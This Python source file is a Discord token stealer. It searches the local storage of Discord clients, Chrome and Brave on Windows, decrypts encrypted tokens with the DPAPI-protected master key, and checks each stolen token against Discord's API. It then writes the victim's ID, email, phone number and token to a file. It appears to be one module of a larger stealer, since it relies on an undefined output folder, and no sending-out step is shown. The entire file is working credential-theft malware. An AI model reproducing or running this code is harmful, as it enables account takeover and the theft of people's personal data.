import os
import re
import json
import base64
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

def token_extraction():
    appdata_local = os.getenv("localappdata")
    appdata_roaming = os.getenv("appdata")
    regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
    t0k3n5 = []

    paths = {
        'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Google Chrome': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    }

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()

    def get_master_key(path):
        if not os.path.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        _d15c0rd = name.replace(" ", "").lower()
        if "cord" in path:
            local_state_path = appdata_roaming + f'\\{_d15c0rd}\\Local State'
            if not os.path.exists(local_state_path):
                continue
            master_key = get_master_key(local_state_path)
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                with open(f'{path}\\{file_name}', errors='ignore') as file:
                    for line in file:
                        for enc_t0k3n in re.findall(regexp_enc, line.strip()):
                            try:
                                t0k3n = decrypt_val(base64.b64decode(enc_t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                                t0k3n5.append(t0k3n)
                            except:
                                pass
                            
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                with open(f'{path}\\{file_name}', errors='ignore') as file:
                    for line in file:
                        for t0k3n in re.findall(regexp, line.strip()):
                            t0k3n5.append(t0k3n)

    return t0k3n5

found = False
tokens = token_extraction()

user = os.getlogin()

if tokens:
    os.makedirs(fr"{foldername}\Discord")

    with open(fr"{foldername}\Discord\tokens.txt", "a", encoding='utf-8') as file:
                    file.write(f"""<=======================[ TOKENS FOR {user} ]=======================>\n""")
                               
    unique_tokens = set(map(str.strip, tokens))  
    found = False

    for token_stolen in unique_tokens:
        headers = {"Authorization": token_stolen, "Content-Type": "application/json"}
        try:
            rsp = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

            if rsp.status_code == 200:
                found = True
                data = rsp.json()
                avatar_url = f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.png"
                phone = data.get("phone", "Non lié")
                verified = "✅ Oui" if data.get("verified") else "❌ Non"

                with open(fr"{foldername}\Discord\tokens.txt", "a", encoding='utf-8') as file:
                    file.write(f"""
━━━━━━━━━━━━━━━━━━━
🆔 **ID :** `{data["id"]}`
👤 **Pseudo :** `{data["username"]}`
📩 **EMail :** {data.get("email", "No")}
📞 **Phone number :** `{phone}`
🌍 **Country :** `{data.get("locale", "Inconnu")}`
✅ **Verified :** `{verified}`
🔑 **Token :**  {token_stolen}
━━━━━━━━━━━━━━━━━━━
                    """)

        except:
            pass

    if not found:
        pass

else:
    with open(fr"{foldername}\Discord\no_token_found.txt", "w", encoding='utf-8') as file:
        file.write("No token found.")